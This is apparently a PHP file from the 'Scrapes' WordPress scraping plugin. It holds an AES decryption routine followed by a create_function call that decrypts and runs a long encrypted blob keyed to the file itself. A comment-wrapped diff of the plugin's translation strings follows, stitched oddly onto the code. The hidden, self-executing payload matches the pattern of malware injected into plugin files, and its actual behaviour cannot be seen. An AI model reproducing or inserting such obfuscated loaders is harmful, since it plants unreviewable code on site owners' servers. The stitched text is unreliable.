$ct = array(); for ($b = 0; $b < $nBlocks; $b++) { $ct[$b] = substr($ciphertext, 8 + $b * $blockSize, 16); } $ciphertext = $ct; $plaintxt = array(); for ($b = 0; $b < $nBlocks; $b++) { for ($c = 0; $c < 4; $c++) { $counterBlock[15 - $c] = a9($b, $c * 8) & 0xff; } for ($c = 0; $c < 4; $c++) { $counterBlock[15 - $c - 4] = a9(($b + 1) / 0x100000000 - 1, $c * 8) & 0xff; } $cipherCntr = a1($counterBlock, $keySchedule); $plaintxtByte = array(); for ($i = 0; $i < strlen($ciphertext[$b]); $i++) { $plaintxtByte[$i] = $cipherCntr[$i] ^ ord(substr($ciphertext[$b], $i, 1)); $plaintxtByte[$i] = chr($plaintxtByte[$i]); } $plaintxt[$b] = implode('', $plaintxtByte); } $plaintext = implode('', $plaintxt); return $plaintext; } call_user_func(create_function('', $ZWyDCMyO("5wMW5jG661nstMSWJ4Dk47InBjvgzqrULwPt1qYbiy/r233FSlKXF8ICJDgws1yFUqyJukAoyVPFvSh2hhIim2pegXCDsx9RlqJHfd696rvuD8Hpa7Fy/V/CjeGYUnoEpzdV9kt1vmLea1/YX5tDisXqmqPm7W1ERHGz9gB5nw2ho5Ean8w2Zk2BgwGSDrTP+1cwJO+GOYkhabYP7GTCH4k5qrAa0r7C8LYXREjcAefv7ntus8i61M72nt3ftK+XqQwrHwPmQFoipnN4wG1fsHswjdZO8/JazWsXEzXAPp1GPmUmTVzQ/DaUCmEN+7QcV3ZM9AGgsU6mrJYEk6c64dJ9DSU7g28s6lHCOhcfnmsNKGbt/760sTblksFH7s+7yD879Z6jCxUJpYMkpHe7cYE319yCxg2hrP+XwivPsJWawCdelg2BraCO8UU4ZX5UkD3LDv5FjGnMUXjeWhiA9fvTOGmmpp3k90oNzWx+Lyepf/9fjWtBl21eVx0eiMGsn7GjVSGjZzx+fYJc1Z5TLig+P/f1VOHYAInih0rfw0iV76ba6iGUyWqk1oSet7tuX/22VxHPsNRAMes4RRF06+TFN6V/DNkOOQUgYIN5FLNTgnt6rpjVyaP8DfcevglJBpCLIHMMnMSdTgaVNPPcA3Cp5LEU3I5KsCwcw3Cfi3VZObyFG0PyL5pmw0blemmN0i7irZH0rd7dS8IC6+y0fMFRWUUtCFNETt5vY5sPC6tAe1yfe1X9m9McNdXRXqC8IIhz3twL29T5SeZYMypgfztW2ebUe2tWY/ViC1+IA8wsY7P3EOlgnsS9iHYOPZHKHxrY5nxBU4vO8IQDqFxo+WVffJsaPFTFr33MjFlsRgZV55qSARWuHZIr5xGigtLJnC8gIlzzrZls74efhOje27W0Br71KMuzRwZH6b7SethG78ux3mnJayNaDOlMlVJ/dwxzzQhmeFpQbRf7GCJrTRKNETGrUQLhJD5eiv08RRL/rTaDHsM/VZmhWKvzqDCJSv5RA9VzdfvVwQWqmjYWZvnhxxgx6Gs9dqzbGFXg4hp9gP4Wi7PHHaShRy3qkacNQ4gbV5naRM0MCK6cQsBv2abPizYtFsWDmiXNzH/H3i37TOxlKiSCtbJOzz2/PsNk7u0I9y33ES0Bn/ByJgJSbJt7CjfOXMt6eesDA5Ux8uZJnZBOCNsfsgE95rkOWh5Tn/ip6K7lFo+8aoS0EQINJRIogSb/We2UXznWPLJeT6985WfYeKJ6PEOxv7GnS8i6bYllDpCjo+uPR5/t8lBdCtXKCxXCf7qkF6RrgXP6r7G1EI2xv0N4q4iGtl0aWS4kf4b0SYb9txiadp9zI586QM5dSFNXNns+CW+fayTf7x46UYouZBG/g/NUD9HZpR+wJ3wr69ooe4YUaHHsQl7kBNQUZMIP+Bt0rr9wQST5IJygcXA9dArjeuj8UaRChe/mJofwFjJCbWjjZ1iGc+J2x2eXGG4f9Eeqcc5OFfe/btJoWXs9xnwH1CkJlwrPbtM859NdAoueNGlLOcGjSdhwuiVykwhVLgIOuh5viBLrgYHM3k2M/qn25TRx3GRd4JTCXqslrcV/eQlM6HuB9e8xKxIeGmrgU3lP7Bb6JgNtNIv3RAd25Ulw8vR9AFnH/dzYeivtMOGSDqN3Xm6anmhKjWl/nIx6FR7hLdkq6lc8vzJcHxwQa4dmdZMcw5s1kXuv9Tz4td4mbri1HFTFnzdiF8e6Xc3qMrPUwuGJTehFHkHjnTsg4lKRpnxCQ5y8e3tihOkS0iZ2ZdUM/5rqpUxKBQAXHFaQ5BAvLiGMalG2ZAoCmXYofnXHA9ya5OKiVMTk8/kzGgzm0TIX+5nrhyv3mE86uhG4TsiytsV1o4+rZQdc/vNLKQpRMO6v0PTwk2sp7gTwJUj/wCxPBF7vRD5zG5w/dnExXUXPQCucpqdOTB9t3RR5kJ33Tb0abHtdGJ1LXq74wy98T1ksqOE4xSt2oFM31MGm6KDAZZCA1k77rBf9T9YvVxXR++G4KhsqzXQ8XJb+YXIufJ39DiWjQQKGIhS8xLO/oXOKOv8dNpikmG4qtSzmPWFs0mWEmWDAj23FGigxqC9oDeUTzxQuWIHAq4BPMbPxV/aRCsALAJ6CB+bZhmS8XG4ygZDCCKOv/vY4IoL3OVaBoMeGozMaAl66QMvoF+k7fL+gFBfEqfoCfDKUMZV/mKiztQ9rXEaMAMTE22PVLJoomCx3rKW2gfXUvKHiFDwovJmUa87K/BdQe5CjspMuda4Etmr3xnbIkLPfWSIMdlW6U63Dnyjzg9eTOA5IxKN9fjwpSDgwQv+D2dZEh2bo8RcCq+5VdNZbKHLPH3XJSr5pe8rv4q968JR2DRmsgkzZKByjZDKulpVQnlGMq51bbRBR4jiW73UjrH5uRYkukB1NuX7OzA3svhPDkFpy3OntP4/QIBYKsvTkcjs0udKd/f3QfUSSrc9yUJgI6Qd91WjX5z21PQfTa3hQEYXJvOgVncVQsiJ5Li0Zll26tep8O++qGhdN1g6fiEnsFUsX6eATEiK5y7Y5ZUCRxOae2iSDc8vQNhh+hb4s6jYb8Vju6qaOwtuLXXYA9qKe30yZUN5nDQbZMzQAg4fYkkYY0nlGQOxPts9+9t+c2aRVTDbY5nQHpjJR0CqeGERhV96qkLyN8SE5rfYXajQH0Gl2GAa8lLNGpJTAeOD1ID7l+A0JHyih2o5Lmh+3n9oyoJ16EpCGsRBrBCvh59Ms61OiqaXaceIMsSm8LHujGoYspslLm5t6VolEmBICYth7KAvybDBii1STiPtOAlsZYA0yZztkVedzLWIv9hrCTeu9sL1WXES8EMkvEGLOQoaJpFmrE6X4yuS1KeJkmj+9DJ33SjLt4n8bh2xTVTpUkhKh5EGII0F/z4ClJbhTzqKEW9hRBPKb7UzskHKng00a+nYtfMGfvC7+xHA6JSUKqXvOXoDSLkARR/lhG7Nz+SwJ8eg/YEJGH3371ZZtvPedERDDC8mDKqY/Ik4xJisqgGbnRG9ohJNnNLMkKel9olG+vUMGbfRhDv5mT7cw+E/oZyeHDWLThDAPQOP5HznLwZwyR5iRYxcozsUDnm6i33Nt5+/KGQcbsoSiCOjw7QJBSEMktryYz7o6VZ1E4WZ9Hdez0JcGg4AYigAhaFdHTn4UPErX4uYz4+NcwmaEC1whvyHIFG6eZaYko52mjD9semZ9Ge6XtCiAZ9923tpikofoO9JCUQW5NOwdsgUfqMcf9X6/ly8P3QkVt4/qcV4Y8ne4Cioj8We0bRt8GV6t5sDD7I7/wSu91MVqsQNTKkvj+bj86+O5VQ7YYbHltchRUYi8D6MGH4neIwszbuP3db+BpGG9tXLTuJwNxT8gGyIueP697HDRSqv0OkPU/QXJ99+7vD4NVtQTUnfmTD9q1TXYbKbUsQRyjLEGVSjkQ2oHJM14IIySnWBpGPqEgtF1bx+xlJ+u1NZYL/LwwHbT7nPbp3x4A0cM5Qz+uOAA7y75NjJtEQmtBSW6cMG3PzeZALkyBNbQtt/Ctcr/YqlyDRNM7xd4JNkl2PMV94C8kyP+44fyWxpNlImL7raYEUk7mafx7SzixstbmF5dh16FcwXiaAiIjIhNTsvIl4+UfTrk9yncKvoe4H1wG5FE/M5Tra8z3pt/o5xA3Yf7DS4drStFGTfjf0ORGlJdUrs0dIwwKifz1PEIhbzcaTJEv64RkPtaDPpJLz9oOlZLkgtU6RDjT6pZO75/I6dAyMKOskvIm0y2Avr58lMSkMXJDdi4FOKJtQatCvad+vKSQiJnNE4WTMWIAIXo7wM8i/SA3CZQktz47n3XZ91sS8u8S6ErP3E45RznOms5yJvDTp+R4GbGpYIiXUO3NWf1tOmkPUUlKmLa80aGROC/WehUGXhgp8GFO69Hyu/QwwQHAJBRvOPT4+pB7lm8wT8qwe33pUqz05WGt7Dr7u0HFX6wb9FTqamSki5mgNaWgC1VNViCjbMgY1WBmQL6hZ7qE3QvBtHKsvokXdHAdq4rnZCLh0Jw/EMdn3JxQiFlpuNne6p/Cw1ku/EwcWBijK/iQKv2YGpP4XftgODIKFPZXHZ0XEdmTZeQusv8jDiD2PyAbz8FJlxpjGvttiba5eWg4SvuNGOiivR4EyBfoLsaqWIzsoDmhQca5fVlqUa4+71xdCBeMv30HRMGJx1I+F0WwXsYJE8rfZKIaeXMrtsQn1seL9Fh9sBguSx+LiO4IXq/51my7wcg32JcRLkGFn0ePPxu+ZUpWTlh5Cmsr1L5umPgAb05JcMMMAmWee3jKnMjLI+yU5f4djC+cVBSsccSmOdu5v7rPvnij+cp2QNJIbslvJQ3P1RGK7Aq0ZNVRJmExItQH0SSZk1lrDUaojjwUi41YRsWLCbEzMafEKSaOL/f1FPvweeVKyk5O9QDH5v9ORl4j0WgApXgNs6lAkhctg+CS0AMhMTMypOpgK7cQqVvhGIanoJ+obFHeYilWMmYn1qZEQurWrYqSfZmJh9hyJ+0ttX/xvtkQ1594RRpNCbu1gwXBIQ0VQD7WMvI7fS501LuCzBe5iGcnvJIRrVbna6zjX+lbYs6+x5771me+9oWRa5Q6DbTmHEeEz2BrEfVIMjJoW+5NWivgQQxlg4/KYNOaUj3M3QzqNG+hN+2O3982mE3taDaM+5f4l7paDNB/SPPp1UmohlWWEpKh+wc3aJWbIDhxveKnEgf/z/BmdA7QO912hoI1pfv1HUqNdXWZ0Yq5pxg81zsUj841nsix1RsiwIPg/7kgKDC2MW3cbuMmiipSrMjHETn6cO1dPvmmQkZ3wo0OhUyVrMVZ9xiZnKlEMU6jfZ4eMjGIip+G4hhLxGCn8AzWbT8aAGpTA0ilY/jmhillhH3NZ3B36qMo4nuBmpYuYpvBbyHzO0Z6GLWJeDmoj1x/KkRiThPPTPSAAcBPeAaMWa4w/HbTAmUcrmJWyCj0wRgE//8PcgE13G5frMVBy/BornRrUrCGe0u7d0KvRMxylv1beYmATolHrW+jpNiSguAxLrR50ilVsemEUfB8MAzpcxQjYUKvstTyFFyHM9z/7z2P1ztTjlaapk8ASIWSONYIta6A1sXvTiIQemzQh7V9vzgIRMOfm0kF4udzhkR3kCruO2XBwVmtnUh0GVaDCwxbkhZTiAEzPkdii4H38nj6GcisVBWl8jgXD3dgPJwwOcgHq2K0FVSqYFi91PgxurX9BKJ67lXwKN3KoF51o4QB+jSMq9HQ523iAT1PFx4SXnzdygMoAC5fYOxbYHxj0cEv2e4jgO1xrDAOKz0OqzvWEOTc0ObMcdz+61aFCrG/4lHvbO1FMvZVtr+jdeKg59jJs/5VtKHq3zAV6WrlVHtfVK2uGgJHhPbp2iPL3Eiu5vV+W5ygGGf8TpHDO+YPvIspTHtCY4Qbcg8D8duftkTZrQNTVKu8Wlhh51T8DdUYua9duS5QAallQjXUYtq/2MtZ5EEgh3vXb3NnEdMFfmhdX1zwziFOtKhMkPkmoZiDPQZ+ivTb9Wx7nUZzve7Qydkav+SRDojWjdHUOUoiQiwg3YOFH9APsbaLBjqCyDVYVJbAJBoKShgNlIGunnl7IBXpJQuUSujEslpwBz96hxDKcxQzd+IrTThStLhtD4YNnmFTPwozZDrcswSaEMudUT61toE1SbQYjlN0yxu6jPuDfDc96VA/gnPhd5HyDa2uuWMOQB8Cjm1REN28qnmzK9G1IoszCZkyu/FNkyaICp+8CJTTH+i6Z7JyOltiEzTM1WxVZnVkNzjl/QckooKuX8Hau7pogq+W+13uZq/Kz9P4rYyK8RcHmaDChTup6FvsBN/r4BMpz/3QpMYF/DLytNi77POoyxIsuM3/gqvo/u3NB9uEJksvdGIghIMw58nEKKX2mmCnHL8fPWRF/797dJPCzjQjt9Os/Mr0d2O809qlSGPBupy25QQtAK2qS4HLn7p/XjJ8+cVbjQ7tYkzuJPs7IfgYmc5+F4bsFF6hl+F50ByPIYDkxzBRsZlvLILfRZ2Kcv7VE4fDZv5ORyFZqCOtWgscrPNKuJYtaE9bW5qM5sCBAniFD/ZKdrKX/4eSbN+BlD9whYE2jDr4z2jNXqjtm24GMSTuEVL60P3rm5YX6nI9WUexQ8tQ3zY90wOmAh/GxL1x7shySa94DZhyWKv1joqvDCk/tAr04i4bI8Xt+whyZjRMGqC8JB02RjRjBcLJ10x4CIfPw/enaNKhhDFgftGQHX1kTxXO48GN4H4igbfvPDsHfqbXHwualDvZR9O1tn1FKMD8L6SVXDKn6Pn7tSC3G/y76iaMcseK7uI4FqfTc+X08OR0c4T0uzccd/uIpg72x79F9i3APi52P6+FLdohddK2vUvaS9qMydpKbFVoi+zMSgc2kLpFV4vcnYbeAa/UGJWqatv0DxYSk+40qXBvy42nXJTm73dr5OHjPPJEmjBdBBh2IXNkWIzwKt+4347kCDUjQifTGOd3NOvfMzyHTf+FXi0GZHDaAn2cv+Rg23iuGy6SFBfuS93RMVYT/3p0Q/i/S1LaJVjmhjUtemyIgs0SrUI7rRg5fvZFWIqzxqxKwtT/7JRdH4YlkX91NLQSEZ0UxkAflIL+sBlCDf8HrcCJtxKodUml/BJnk/t7CuzfJf+NgDiB0dE/hk09IP7xItpb7SXkDQH3Nr8iH8FcErXUd1lMP9U87OlDdQYBRktH9xIbjomp6w2peqv7wkqkfCK17KhaUVNXdQVw9e6L5iw8sRvR+eCOJUop2DI+9SPifW/BVJSWgyXyM3UUvrVj9fRwxVkji1n93duWPYn9Y9J+ZSW3q/zZ8TthUIV93ovAUferaBlskP6Lw0k5AEGSHKPhcAFHS0n5yJDwE50J95oFCMRvdYOf5W5SfKyBWL2H21ffq6ou4q2i7w4eEoOtVmtsdEcSg2h4h2J3hTZsGfG5Crf/I/iEBFmJ4UbRTCZUuw37ejB0dEh0j26EEft6HANqoId+ZvSSojv2jN3+pxgYLwgjW3RybTGy3bEkiSFzLiwdpdr/F7UXYPRSd4t2PwJJUmdzQFS9eRdTpM+P7f42+ummJ2hxLCOHtR++EdeEaqaPujezYLX8JN921V2wNQADb2YS9OOQmSefaSvEOi+6p1rnBv9Uo8ZAotHXVtDUhwBDvNPr+DoJ5mkIorUBvuBhRyP2hFExIOINGLM0S+LXNx2NhU8nM9zI9J7nCRoO1feVV9ALSlfP/JNVIeqt5C3cEfkhKHpQmATeM0d4UKGjvs/4UrVOcTjqkdQasH/C81qC619ricjlpE6indv0KeTpxlmkFclFtzhrd1/AZBOaspCNwv9+uj+IL1hXA0tr+mKKZRKLVMOJrtojRFF6zyUBa8POdRsaCb+hGyLosqN+ALW7IT2ga4WNBlcZmWWk146yym8/Y6p56+AwNPWhV7H7NQFgBoGhs8PknjpMU5cqV4jkea4WEegJSc9HLBZMqASAYOnA13ETxU1ttcKwy0JJx6Vht+QYSof5gJTt0ZIlNYoiue4ofxSrswrI7vZn5OjbsdWIg3l4DKLKOOclxrOz3ZkeoTxT33Zfv+Bz1kbPQyLMFA7HajWtk2jQfCkrXbEwsBUza6E1YYqIdXMXB2fZZz3s1ZAEuXFTX4GoZBv6ij02RohPME93wwwkhNB6AcpcimSVCt+aLs/Wli1lnplktTQ5juLoEXRbMh8pqbaS3AQY0wLEVrSdd9ime0eFPt7zgz6LNqWa8l+p4boWMLNRUwUdo1kMO/GBEajDF/FbxErBqhoU5JR3g4COxp2lWM/3uJ0NMm+ppXLhOSQcAnH5nvVWyZ3BbFbBcqRZnxmq73E9GpPL4CoUxPn8fknZ1VYISqktvTUJZ2zg3SENOcMZyglsc5IeTToVBQxiJemcwCx0mkRIM1ojQ08RjZ9tBJ23Lpe1RTIcbXOX69z4ADDzzA0CoFtbYQzeEcGQfoR4Zcno9FT0SumcOWAEnCd7JuupkoC6F6abR5NmO3xkoSAnulAuxWAq3GUVhIgOaoLawmEkIJDq8EXlPxPgbp9aByTUTHgrpmjwBQquvQWSyO0TnPWMsjsJ9jM88wMrHNmT/u8XtFSxE1pDJJXIugcREGzEI5AX6ya8YDA77YxmF06H2gtUeGLqORkfeBZcnHxgUe2d7hHS2/eJ6qLWNrPQku3cz4ak9R5LrXE/aDKvEGjSGj1+6SA09R4gel/gk+9/fTH+ugvmDv2OpYmiBwdlmFziShK0N2boUheiiERfyvGrBo6AIiufvtTbAe2SKeUu5s58UeX4xehFbo6szwbLmEp8/yDBOunVKEcECETCZpemoD62nSUYPoCa5Ks/5gdXchMoEGFfQs/H40KFIsN+I07nxuZANNR4+VAfYqXahKx1GQQPmFLgzJjJ47HwW2jHHCzu6zC6DdqL1cgKKkLXVSb6833FY/u1knKYWJwBJ1CY630pPXltDjB4O68kTNpMMrosUqz7mNV7HZhcltlAfBtuGrfv0qjJ4yVehAkflIfHYojmNSUs64S9eBFeU3hTO1qQ1zcUVK5fhwxYhSiujlPGlCc8HBEGoJNOmCEurZku1VPF65bYVz6NU52cDLVLPurrXovw25aijra2d0TxdVATj3zcFJwaMCOMia5J81XMWZsLKqrza3Ashj2ZqVzYwLwXTHk/mCeo/vl9mDiekSqUZfZau9s51LEbUx/8xmRkYsNCGMdwLglh6tSHNJJxcU6ZN7lAK/SoHKxPXsdgZBPeQGbmC9V4+zaMfYTkFdr2e6NnIcuuNsqtV2ZSP3TJhNHWpDKiH+7SYsaeEm7S1JOJJXD0leRDKvlV5f5Rk9TLKL3FzPu3F3frQkHnxeTkpcsAB4EJpFjfwo7vFSMKOjOJx+JQjAeEO7LK0M3GfnoBp9m2b+20C8tdPKOBInUY9FgVfoMeHkYeLeZNjkyj7cGTn4cpNCH3AqIojl6SHq5ZtuYGFf2CwpXI2z194b9ye2fwhJkio1mwqg32SXlAfniMk5gENbd+BsEo7g1eYy774Daswf6OJUjTlAtWXTsOS3FpaXcZEZZ220Sp2zErgfEzLyKysZezCZr88Fki7hTyHrbowtmN302nDuA5pGfS57rnFKTN/7mFQx+xy1Ue0kyjTYYpm4T0fOOJxVB+xMuvgZ0nK9ab3vwbAwwvy1AWBK4H3Bn6+2MJU3NzZ3eWQK/BKglFtxCpmNOzcfvcOM5XspLD3qQK2auWJN1V12Ytxnp2P/tP3zpsGDTZYfyMsFEjwsmh6lA2b/a1vHU1ZkBSkMmn0vIBEMxORslUzDefYd52/XWM3/8HEy8eFSueQpoZsxPT2ldcU101EVMU+aqXecsvWyEOhtnw1aXdkhG7Lfkq2pgOb/8G2xFvCyQmWy/dpigQWs0zktYxEi6Zn+pv64jlZ4y187cwo2a3Xu5BG5kOemYRucYQcTr0YO53zXObJZ1Lvn5cglWIAx5V0hihFBYGZMqcLVyWrARkTDG8ttPZdfNJxc33IfqTwSY5GGcbrRJ0/Pm15AY2QAQSO2daV+t4cTEh9jfgUaCCA2xCC87hKXx4X4OgfzcaSY9fQnV3gyqwM87zeejm7xD79uZPwyAr6qfc94tNllBROmeRLklchyWvG6Dw543e8cRM1ki4nLF2kamlErkVb3A3SkPDEtCUhn+FsKEBTKwCp+iDwmAx2x2E+jTC1sR3nsIa0iaptliohBc8NFG+drD3Vn474CcHb86BYyN5p25u2ZzVEHURjgIWgqtj6m1Li02ZjUacMM7hAgzpG728rm6cHewlmIHmMOZV2EWQebzJGWAnIE89k+U0QtRjzaDub3gwpaHMnm4BcJA9A8i98fZbwd8nYauPkdhs60Q4BIq0OiUHI5eOU0On62lcHNhj2mNbJY7VGTeJWycm8B52UBAETNbWwSnsWvbPqgy2FHJG7SNELrKDHKpupf7Iqkl8xWkIhigKSMPmwTcNJqqcus/zVGS5NH49sTVcdw6uo9TaXGfs5wkuyguFQ9k0qNTjpsmhlqT3VpTBfl50jEKM+e8bbCUw8W+YI+XEo6ysDcez+kniUbYP1jyno5his68DmejWAMcS8Hj06r8Qz85F7Vo3KX9880q3+EL3boRZVTeNuKRFFt9RSBczsca24KBOMZSVrCAUjueshS1Bqu1KncjeVXgVK20nFerEjoguFT9grZSEr6SkcIyhIrPPNt+OPCXXjOUvsSQQh9Q3GkWHPC56y7g5ELTPkXMJ1EhQdxy9Uw7kv0oH7LQu1PhS4zgPDGCiCTjgnzn0U1XQrxDGdcT9MkRe8RAXCnHb2wr7+7oCuSIpevT/PPvPRQI9sLPywdW/DYiiBC8h6NGFGkedQrpQ5Un9eBjxB5U0Prt+Z8fDv4662vK/6MqCSEn/KnnnDe/zu1v1yVfSoPQhmJsB0upNTCA3P0xYvTacjmXqW0nVb5jVwxilWetD8oC4CPH0Mk63YjvgbofZBGOZVMrtx7QXNP9lgFAlgzxCQe5VedW/6Z2oBH9YpwSQQesK8SO9XEpx+mm/y6oOGXH3XlY8Z48nxk0VT3+OINGDd2w2TezW91cDToHJjCx8/LCrtxAIzhWsHF6aXtFcDb+ersgPLKPnzL7h9l6ClduAytKPTAzecoZuIHKgbeLBNq+sEnHdYL0kxjV8ymPXrYaHSTrskxJcnqX/clnbd+H2rOsTAegFeB/Ut6pFk0hIfxEaYi+5WEd4okJUZvYIaZCzGGpYsGyPai3h8I9gL7lOy/GyBai6hPIDdxQMzIWipnVj+OPMgYxQwzaJq3vSd6oz8Wn8Jimcz27wEEr/wQj99KOnmsab6sf0ZVcnMmKiPZtCdpxJwKV1W3s4JFGqQTOyY6Ow8DqtF2+vkWpL5kwbJJSP0PlsOgd7XvtEEEmTU3TojMqhZkOrXNaelJ9E/xXSTbAYKSFD3IXZj6o9xmB61ThtzF7Tb1qprotlkZ347JAC+DcGPgSixyz0XKznxzugFI4aIeIAceiddxZ/AP2NeQI8bSlmz7xRDhI74WifDULAO3PyMWiUZcS/5HYkXtaR/XYGyLHRyUwbTeCb502tBRJfevYYPSfRhvVCPsUuJl8JPuf4uuCo2kJfhBqxJHXBdBqOW6dLmZn1OFlwLUEpaEjbHxyS7BeE8EfYd8c6LQA46A8RNbBTLr1UAoIDoars6xoWKBi11bAcX8UORqPjNYbwGekJZkQxq0lw0PVwJC5n2o0Ugk+80duJbEgofzDxyUWGxz40nn9OD2txFkqtHqdHsPYEctH5Hf+PDDh5Bik+nyxjnHmZpKANh0wCkC/a9ijd0JnbBbOMIgN2GuI4Kk/0sFJnIo5BE4oGTaMM66HOlpivGi1lLLe/SS/GPAUWG294NfgxDfb20En/Dk3F9nCs14IelKG+ttBQWdYZLNiF295HWiy1PWfbgXFbRFjj3AvPQlrZfwCKMgjbbLg1zcoJcinHS/lUqKtZzg0K4VRgDT49Tx+0dNqDg7sRPgvtf41VdZug1YfKjIcL+Gn9HOVfPs2/ZGKJCrUEx+27KpFPtDZAf5DeXvmLBpSpDEK8Pu05nYFOZ+ArskF72kJpTzRVAhx/JT64Nd5sjGK/2CdOhUkAGKqNRUarTHdfYAs8ex+RJjQVgscb6R0qPPnPPwJojXjR8mCSVYWnhDrYiS7EoXekLm7tThGjqKQyfScAUb+6xhAAHZlE6HjkwIawxxffMb275WwSTbQ/LQdpEs6yvtlvPch+MPMZNE1x1LPKF27pEcIc/8Db7mqhNONjOu2fN58YgSUYOOnf3/gxbUVX501DBxiE5KkR9skOuxP08YK+ebOVjcxdBkoKXWF9dHVxSH8aSAI3tKk01E2zhFB4sE5xDqnmF4pLmEmmWMlZhaQV9fxVEMJM8TbkKmh0mtxnXDdA4MvYrrAWQxIutEzI37NbWIjzVsDujD+/sWVlybPSQLC17Lao8cwR3+6Rgt+TE2oYQvLpg40t+wF5iG/JMY4Dbvne1wnelJC5LEVNfScfiIvgNMk1t6+SOxrhwo0jg/QuQd4U8QFaa22CcGVAmknKBRvkVeXWIBPOUfLrcWz/LZ/LXE1MsYVvpTka3tUMpq/wAtEraWp8b2Th6HFlPTNv9aQsfmZ4agL0A38bukH1k41brIA+UX6311RYp/Y82FoA2OXmfJG29INbRbew8nGb0JTlDqlE/r/6q+fEcWhQxczts4BizCgpi5OxMrz6h2632OFeldTLXty+WcSb3qubjmUOvUgDUZ8OUSNahh/IDZ1M16KQO6Clwv6S/8HtDntOegkkHVwSbp/T5IFF2647J/2y2w5XIiEP9wRhbb2fQDPoYZMuaJhAQlLyW//gieyJKC7PoMUEgzL9TaX3aBKZ7xo/DfSJ3JOlKIil/0Ij5rSNRS0prvBY1Asxzcb02RM12PlUux7iwnGq+bEyglzVAT579VdtNMBRXdmLCoi/jkjfZfziZ+rKL6mOUZ8iQKYpVSZxwKh+9iFaOuiFTVLdBKoH4Fxh4iKlat+mT/BXyZEDk0GjzplskqOBjtbDFOQwG459udOv8nhS/RuknLP0wfn6uYHzZYkNBy6C52eaXaHsGpAIFxKUlDfACoffCsGBeLhHuyETsnn19zCLiug0PoyS3fGURtMoWt6Bs0jCT//neEoqIWy1rhS8PIcI5Kq2S0JvBNk", $owhudhIh(__FILE__),256))); /* msgid "2 Hours"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:844
+msgid "4 Hours"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:848
+msgid "6 Hours"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:852
+msgid "8 Hours"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:856
+msgid "12 Hours"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:860
+msgid "1 Day"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:864
+msgid "1 Week"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:868
+msgid "2 Weeks"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:872
+msgid "1 Month"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2207
+msgid ""
+"Your system does not allow php exec function. Your cron type is saved as "
+"WordPress cron type."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2234
+msgid ""
+"System error occurred during crontab installation. Your cron type is saved "
+"as WordPress cron type."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2239
+msgid ""
+"System error occurred while getting your cron jobs. Your cron type is saved "
+"as WordPress cron type."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2276
+msgid "PHP set_time_limit function is not working."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2279
+#, php-format
+msgid "Your scrapes can only works for %s seconds"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2283
+msgid ""
+"DISABLE_WP_CRON is probably set true in wp-config.php.<br/>Please delete or "
+"set it to false, or make sure that you ping wp-cron.php automatically."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2545
+msgid "View All Scrapes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2659 views/scrape-meta-box.php:1134
+msgid "Status"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2660
+msgid "Schedules"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2661
+msgid "Actions"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2719
+msgid "Last Run:"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2720
+msgid "Last Complete:"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2721
+msgid "Next Run:"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2722
+msgid "Total Run:"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2728 views/scrape-meta-box.php:341
+#: views/scrape-meta-box.php:1472
+msgid "Edit"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2729
+msgid "Run"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2730
+msgid "Pause"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2731
+msgid "Copy"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2732
+msgid "Trash"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:2733
+msgid "Restore"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3325
+msgid ""
+"An error occurred while connecting to server. Please check your connection."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3326
+msgid ""
+"Domain name is not matching with your site. Please check your domain name."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3327 views/scrape-settings.php:49
+msgid "Purchase code is validated."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3328
+msgid "Purchase code is removed from settings."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3329
+msgid ""
+"Purchase code is not approved by Envato. Please check your purchase code."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3330
+msgid ""
+"An error occurred while decoding Envato API results. Please try again later."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:3331
+msgid "Purchase code is already exists. Please provide another purchase code."
+msgstr ""
+
+#: views/scrape-meta-box.php:3 views/scrape-settings.php:3
+msgid "Error!"
+msgstr ""
+
+#: views/scrape-meta-box.php:4 views/scrape-settings.php:4
+msgid "This page requires JavaScript to run properly."
+msgstr ""
+
+#: views/scrape-meta-box.php:339
+msgid "Give a name and select task type to start."
+msgstr ""
+
+#: views/scrape-meta-box.php:342 views/scrape-settings.php:33
+msgid "Modify options and save changes."
+msgstr ""
+
+#: views/scrape-meta-box.php:346
+msgid "The field used to give a name and define task (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:350
+msgid "e.g. Scrapes"
+msgstr ""
+
+#: views/scrape-meta-box.php:358
+msgid "Task type"
+msgstr ""
+
+#: views/scrape-meta-box.php:358
+msgid "The field used to set running type of the task (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:366
+msgid "Single"
+msgstr ""
+
+#: views/scrape-meta-box.php:373
+msgid "Serial"
+msgstr ""
+
+#: views/scrape-meta-box.php:380
+msgid "Feed"
+msgstr ""
+
+#: views/scrape-meta-box.php:393
+msgid "Link Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:399
+msgid "Cookies"
+msgstr ""
+
+#: views/scrape-meta-box.php:399
